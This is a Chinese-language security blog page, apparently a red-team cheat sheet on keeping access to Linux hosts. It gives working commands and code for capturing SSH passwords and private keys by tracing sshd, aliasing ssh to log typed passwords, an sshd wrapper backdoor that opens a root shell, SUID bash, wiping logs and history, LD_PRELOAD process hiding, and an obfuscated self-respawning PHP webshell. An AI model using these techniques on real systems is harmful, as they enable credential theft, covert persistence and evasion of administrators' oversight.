<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>

<p>再把公钥id_rsa.pub发送到目标上，同时赋予权限，但是权限不能过大。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 ~&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">chmod 700 ~&#x2F;.ssh</span><br></pre></td></tr></table></figure>



<h4><span id="setuid-and-setgid">setuid and setgid</span></h4><p>推荐vim/find/strace/bash设置suid</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>可用于提权操作</p>
<h4><span id="strace">strace</span></h4><ol>
<li>使用前先查看当前系统的ptrace_scope,默认为1，可改成0不限制。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看</span></span><br><span class="line">cat /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line"><span class="comment"># 修改</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/yama/ptrace_scope 或者 sysctl kernel.yama.ptrace_scope=0</span><br><span class="line"><span class="comment"># 当kernel.yama.ptrace_scope的值设置为3后，必须重启系统后才能更改</span></span><br></pre></td></tr></table></figure>

<h5><span id="收集任意已有进程登录凭证">收集任意已有进程登录凭证</span></h5><p>1.获取sshd进程明文密码<br>root权限运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用括号执行程序，当前shell退出，执行的程序不会退出</span></span><br><span class="line">(strace -f -F -p `ps aux|grep <span class="string">"sshd -D"</span>|grep -v grep|awk &#123;<span class="string">'print $2'</span>&#125;` -t -e trace=<span class="built_in">read</span>,write -s 32 2&gt; /tmp/.sshd.log &amp;)</span><br></pre></td></tr></table></figure>

<p>查找用户名和密码的正则表达式为read(6, “.+\0\0\0\.+”</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找用户名和密码</span></span><br><span class="line">grep -E <span class="string">'read\(6, ".+\\0\\0\\0\\.+"'</span> /tmp/.sshd.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果形式如下,注意ssh-conection关键词前后行，即时账号和密码，如图账号密码为root/toor。</span></span><br><span class="line">[pid  2401] 22:34:34 <span class="built_in">read</span>(6, <span class="string">"\10\0\0\0\4root"</span>, 9) = 9</span><br><span class="line">[pid  2401] 22:34:34 <span class="built_in">read</span>(6, <span class="string">"\4\0\0\0\16ssh-connection\0\0\0\0\0\0\0\0"</span>, 27) = 27</span><br><span class="line">[pid  2401] 22:34:34 <span class="built_in">read</span>(6, <span class="string">"\f\0\0\0\4toor"</span>, 9) = 9</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>获取sshd进程私钥</li>
</ol>
<p>root权限运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用括号执行程序，当前shell退出，执行的程序不会退出</span></span><br><span class="line">(strace -f -F -p `ps aux|grep <span class="string">"sshd -D"</span>|grep -v grep|awk &#123;<span class="string">'print $2'</span>&#125;` -t -e trace=<span class="built_in">read</span>,write -s 4096 2&gt; /tmp/.sshd.log &amp;)</span><br></pre></td></tr></table></figure>

<p>查找私钥直接搜索字符串PRIVATE KEY</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果私钥设置的了密码，似乎不能抓到私钥密码</span></span><br><span class="line"><span class="comment"># 查找用户名和密码</span></span><br><span class="line">grep <span class="string">'PRIVATE KEY'</span> /tmp/.sshd.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果形式如下，注意保存的时候看换行符是否还在。</span></span><br><span class="line">[pid  1009] 23:17:34 <span class="built_in">read</span>(4, <span class="string">"-----BEGIN OPENSSH PRIVATE KEY-----\n.......-----END OPENSSH PRIVATE KEY-----\n"</span>, 4096) = 2590</span><br></pre></td></tr></table></figure>



<h5><span id="收集任意指定程序登录凭证">收集任意指定程序登录凭证</span></h5><p>这一块主要用于收集当前linux主机登录其他主机的凭证</p>
<ol>
<li>收集ssh登录凭证<br>添加命令别名<br>这里日志文件名称是/tmp/ssh-xxx.log</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加命令别名</span></span><br><span class="line">vi ~/.bashrc或者/etc/bashrc</span><br><span class="line"><span class="built_in">alias</span> ssh=<span class="string">'strace -f -e trace=read,write -o /tmp/.ssh-`date '</span>+%d<span class="string">'`.log -s 32 ssh'</span></span><br><span class="line"><span class="comment"># 使命令别名立即生效</span></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>

<p>可以通过正则.+@.+\bpassword定位密码位置</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep -E  <span class="string">'.+@.+\bpassword'</span> /tmp/.ssh-21.log</span><br><span class="line"><span class="comment"># 根据过滤出来的第一列数字，可获取输入密码的read，以\n结束</span></span><br><span class="line">cat /tmp/.ssh-21.log | grep 936 | grep -E <span class="string">'(write\(4|read\(4)'</span></span><br></pre></td></tr></table></figure>

<p>记录的strace文件如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">936   write(4, <span class="string">"root@192.168.168.20's password: "</span>, 32) = 32</span><br><span class="line">936   <span class="built_in">read</span>(4, <span class="string">"t"</span>, 1)                   = 1</span><br><span class="line">936   <span class="built_in">read</span>(4, <span class="string">"o"</span>, 1)                   = 1</span><br><span class="line">936   <span class="built_in">read</span>(4, <span class="string">"o"</span>, 1)                   = 1</span><br><span class="line">936   <span class="built_in">read</span>(4, <span class="string">"r"</span>, 1)                   = 1</span><br><span class="line">936   <span class="built_in">read</span>(4, <span class="string">"\n"</span>, 1)                  = 1</span><br><span class="line">936   write(4, <span class="string">"\n"</span>, 1)                 = 1</span><br></pre></td></tr></table></figure>

<p><a href="https://xz.aliyun.com/t/7698" target="_blank" rel="noopener">https://xz.aliyun.com/t/7698</a></p>
<h4><span id="ssh-wrapper测试会导致正常登陆无法使用">SSH Wrapper（测试会导致正常登陆无法使用）</span></h4><p>原理：</p>
<p>init首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell。</p>
<p>来自 <a href="https://www.anquanke.com/post/id/155943#h2-9" target="_blank" rel="noopener">https://www.anquanke.com/post/id/155943#h2-9</a></p>
<p>Exploit:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;sbin&#x2F;</span><br><span class="line">mv sshd ..&#x2F;bin&#x2F;</span><br><span class="line">echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if(getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">echo &#39;exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;sshd restart</span><br></pre></td></tr></table></figure>



<p>连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat STDIO TCP4:target_ip:22,sourceport&#x3D;13377</span><br></pre></td></tr></table></figure>



<h4><span id="openssh-rookit暂不使用">Openssh Rookit（暂不使用）</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要安装环境依赖，可用性不是很高，参考https:&#x2F;&#x2F;www.cnblogs.com&#x2F;bigdevilking&#x2F;p&#x2F;9535427.html</span><br></pre></td></tr></table></figure>







<h4><span id="pam后门暂不使用">PAM后门（暂不使用）</span></h4><p>PAM （Pluggable AuthenticationModules ）是由Sun提出的一种认证机制。</p>
<p>它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。</p>
<p>项目地址:<a href="https://github.com/litsand/shell" target="_blank" rel="noopener">https://github.com/litsand/shell</a><br>这是一个自动化脚本</p>
<p>比较适用于centos,测试环境是ubuntu,暂时不复现.</p>
<h2><span id="隐藏技术">隐藏技术</span></h2><h3><span id="简单的隐藏文件">简单的隐藏文件</span></h3><p>可以找一些目录隐藏自己的恶意文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch .wing.py</span><br></pre></td></tr></table></figure>

<h3><span id="隐藏权限">隐藏权限</span></h3><p>chattr命令可以给文件加<code>锁</code>，防止被删除，我们也可以将它利用起来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加锁</span></span><br><span class="line">chattr +i evil</span><br><span class="line"><span class="comment"># 查看</span></span><br><span class="line">lsattr evil</span><br><span class="line"><span class="comment"># 解锁</span></span><br><span class="line">chattr -i evil</span><br></pre></td></tr></table></figure>



<h3><span id="ssh隐身登录">SSH隐身登录</span></h3><p>隐身登录系统，不会被last who w等指令检测到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># w命令看不到</span></span><br><span class="line">ssh -T root@x.x.x.x /bin/bash -i</span><br><span class="line"><span class="comment"># w命令看不到，不记录ssh公钥在本地.ssh目录中</span></span><br><span class="line">ssh -o UserKnownHostsFile=/dev/null -T root@x.x.x.x /bin/bash -<span class="keyword">if</span></span><br><span class="line"><span class="comment"># 登陆后 不记录命令</span></span><br><span class="line"><span class="built_in">unset</span> HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; <span class="built_in">export</span> HISTFILE=/dev/null; <span class="built_in">export</span> HISTSIZE=0; <span class="built_in">export</span> HISTFILESIZE=0</span><br><span class="line"><span class="comment"># 无痕模式，禁用命令历史记录功能</span></span><br><span class="line"><span class="built_in">set</span> +o <span class="built_in">history</span></span><br><span class="line"><span class="built_in">set</span> -o <span class="built_in">history</span> <span class="comment"># 恢复</span></span><br><span class="line"><span class="comment">#删除部分日志,比如以当天日期或者自己的登录ip</span></span><br><span class="line">sed  -i <span class="string">'/当前时间或其他关键词/'</span>d  /var/<span class="built_in">log</span>/messages</span><br><span class="line"><span class="comment"># 删除100行以后的历史记录</span></span><br><span class="line">sed -i <span class="string">"100,<span class="variable">$d</span>"</span> ~/.bash_history</span><br></pre></td></tr></table></figure>







<h3><span id="rookit-reptile">Rookit-Reptile</span></h3><p>可隐藏网络连接、进程、文件等等</p>
<p><a href="https://github.com/f0rb1dd3n/Reptile" target="_blank" rel="noopener">https://github.com/f0rb1dd3n/Reptile</a></p>
<p><a href="https://www.notion.so/redteamwing/Reptile-LKM-Linux-rootkit-153c8daa25244ce69461d1515375e8cc" target="_blank" rel="noopener">https://www.notion.so/redteamwing/Reptile-LKM-Linux-rootkit-153c8daa25244ce69461d1515375e8cc</a></p>
<h3><span id="隐藏进程未测试">隐藏进程（未测试）</span></h3><p><a href="https://github.com/gianlucaborello/libprocesshider" target="_blank" rel="noopener">https://github.com/gianlucaborello/libprocesshider</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">利用 LD_PRELOAD 来实现系统函数的劫持，实现如下：</span><br><span class="line"></span><br><span class="line"># 下载程序编译</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;gianlucaborello&#x2F;libprocesshider.git</span><br><span class="line">apt-get install  gcc automake autoconf libtool make</span><br><span class="line">cd libprocesshider&#x2F; &amp;&amp; make</span><br><span class="line"># 移动文件到&#x2F;usr&#x2F;local&#x2F;lib&#x2F;目录下</span><br><span class="line">cp libprocesshider.so &#x2F;usr&#x2F;local&#x2F;lib&#x2F;</span><br><span class="line"># 把它加载到全局动态连接局</span><br><span class="line">echo &#x2F;usr&#x2F;local&#x2F;lib&#x2F;libprocesshider.so &gt;&gt; &#x2F;etc&#x2F;ld.so.preload或者export LD_PRELOAD&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;libprocesshider.so</span><br></pre></td></tr></table></figure>

<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15682803207888%5B0%5D.jpg" alt="img"></p>
<p>运行</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15682816373895.jpg" alt="img"></p>
<p>效果</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15682816496340.jpg" alt="img"></p>
<p>具体的进程名字，自己可以在c文件里面设置</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15682816852589.jpg" alt="img"></p>
<h3><span id="linux-inject一般用不到">linux-inject（一般用不到）</span></h3><p>linux-inject是用于将共享对象注入Linux进程的工具</p>
<p>项目地址： <a href="https://github.com/gaffe23/linux-inject.git" target="_blank" rel="noopener">https://github.com/gaffe23/linux-inject.git</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 下载程序编译</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;gaffe23&#x2F;linux-inject.git</span><br><span class="line">cd linux-inject &amp;&amp; make</span><br><span class="line"># 测试进程</span><br><span class="line">.&#x2F;sample-target</span><br><span class="line"># 进程注入</span><br><span class="line">.&#x2F;inject -n sample-target sample-library.so</span><br></pre></td></tr></table></figure>

<p>先编译自己定义的c文件<br>安装依赖包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get purge libc6-dev</span><br><span class="line">sudo apt-get install libc6-dev</span><br><span class="line">sudo apt-get install libc6-dev-i386</span><br><span class="line">sudo apt-get install clang</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">__attribute__((constructor))void hello() &#123;    puts(&quot;Hello world!&quot;);&#125;</span><br></pre></td></tr></table></figure>

<p>生成so文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC -o libwing.so hello.c</span><br></pre></td></tr></table></figure>

<p>先执行测试的文件</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15683031490430.jpg" alt="img"></p>
<p>然后注入自定义的so文件</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15683031360757.jpg" alt="img"></p>
<p>注入成功</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15683028269419.jpg" alt="img"></p>
<h2><span id="参考">参考</span></h2><p><a href="https://xz.aliyun.com/t/7338" target="_blank" rel="noopener">https://xz.aliyun.com/t/7338</a></p>
<h1><span id="数据库">数据库</span></h1><h2><span id="mssql">mssql</span></h2><h3><span id="触发器">触发器</span></h3><h3><span id="后门账号">后门账号</span></h3><h2><span id="mysql">mysql</span></h2><h3><span id="后门账号">后门账号</span></h3><h2><span id="oracle">oracle</span></h2><h3><span id="后门账号">后门账号</span></h3><h1><span id="web">WEB</span></h1><h2><span id="iis后门">IIS后门</span></h2><p><a href="https://github.com/0x09AL/IIS-Raid" target="_blank" rel="noopener">https://github.com/0x09AL/IIS-Raid</a></p>
<h2><span id="php不死马">php不死马</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ignore_user_abort(<span class="keyword">true</span>); <span class="comment">//函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</span></span><br><span class="line">set_time_limit(<span class="number">0</span>); <span class="comment">// 函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。</span></span><br><span class="line">unlink(<span class="keyword">__FILE__</span>); <span class="comment">// 删除文件本身，以起到隐蔽自身的作用。</span></span><br><span class="line">$file = <span class="string">'favicon.php'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xorencrypt</span><span class="params">( $str, $key )</span></span>&#123;</span><br><span class="line">    $k = substr($key, <span class="number">0</span>, <span class="number">1</span>);$cipher = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;strlen($str);$i=$i+<span class="number">1</span>) &#123;$tmp = substr( $str, $i, $i+<span class="number">1</span>)^$k;$cipher .= $tmp;&#125;</span><br><span class="line">    <span class="keyword">return</span> $cipher;&#125;</span><br><span class="line">$code = xorencrypt(base64_decode(<span class="string">"SEsEHARUEQIVGFxQKyQ7JyBcVgARBwBWXV1LSg=="</span>), <span class="string">"test"</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($file)) &#123;</span><br><span class="line">        file_put_contents($file,$code);</span><br><span class="line">        system(<span class="string">'touch -m -d "2018-12-01 09:10:12" .favicon.php'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 下面建议设置长点，单位是微秒，5分钟即300000000</span></span><br><span class="line">    usleep(<span class="number">5000000</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2><span id="java内存马">java内存马</span></h2><p>通过doFilter和Servlet实现内存注入</p>
<h1><span id="权限维持工具">权限维持工具</span></h1><h2><span id="cobaltstrike">CobaltStrike</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、beacon的加载过程</span><br><span class="line">4、CS功能熟悉</span><br><span class="line">2、CDN域前置</span><br><span class="line">3、profile优化</span><br></pre></td></tr></table></figure>

<p><a href="https://wbglil.gitbook.io/cobalt-strike/" target="_blank" rel="noopener">https://wbglil.gitbook.io/cobalt-strike/</a></p>
<h2><span id="msf">msf</span></h2>
    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2020/09/17/Java%E5%AE%89%E5%85%A8-sql%E6%B3%A8%E5%85%A5/" rel="prev" title="Java安全-sql注入">
      <i class="fa fa-chevron-left"></i> Java安全-sql注入
    </a></div>
      <div class="post-nav-item">
    <a href="/2021/02/21/java%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/" rel="next" title="java安全/Java安全">
      java安全/Java安全 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  

  </div>


          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">1.</span> <span class="nav-text">windows</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">1.2.</span> <span class="nav-text">后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">1.2.1.</span> <span class="nav-text">自启动后门</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">Startup目录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">注册键</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">服务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.2.1.4.</span> <span class="nav-text">计划任务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.2.1.5.</span> <span class="nav-text">WMI</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.2.1.6.</span> <span class="nav-text">屏幕保护</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.2.1.7.</span> <span class="nav-text">后台智能传输服务（BITS）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.2.1.8.</span> <span class="nav-text">后台打印程序服务（还需制作dll，ok）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#null"><span class="nav-number">1.2.1.8.1.</span> <span class="nav-text">制作</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.2.1.9.</span> <span class="nav-text">Netsh（还需制作dll，ok）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#null"><span class="nav-number">1.2.1.9.1.</span> <span class="nav-text">制作</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.2.1.10.</span> <span class="nav-text">AppCertDlls(需要制作dll，ok)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#null"><span class="nav-number">1.2.1.10.1.</span> <span class="nav-text">dll制作</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.2.1.11.</span> <span class="nav-text">MSDTC（还需制作dll，复用）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.2.1.12.</span> <span class="nav-text">映像劫持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.2.1.13.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.2.1.14.</span> <span class="nav-text">补充 MSF</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">1.2.2.</span> <span class="nav-text">被动后门</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">后门账号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">劫持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">多用户登录</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">1.3.</span> <span class="nav-text">隐藏技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">1.3.1.</span> <span class="nav-text">文件隐藏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">1.3.2.</span> <span class="nav-text">任务计划隐藏</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">非完全隐藏</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">完全隐藏</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">1.3.3.</span> <span class="nav-text">进程隐藏(待定)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">1.3.4.</span> <span class="nav-text">驱动级文件隐藏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">1.3.5.</span> <span class="nav-text">进程注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">1.4.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">2.</span> <span class="nav-text">linux</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">2.1.</span> <span class="nav-text">后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">2.1.1.</span> <span class="nav-text">自启动后门</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">crontab</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">2.1.1.2.</span> <span class="nav-text">service</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">2.1.1.3.</span> <span class="nav-text">启动项</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">2.1.2.</span> <span class="nav-text">被动后门</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">2.1.2.1.</span> <span class="nav-text">SSH软连接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">2.1.2.2.</span> <span class="nav-text">克隆账号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">2.1.2.3.</span> <span class="nav-text">SSH公钥免密登陆</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">2.1.2.4.</span> <span 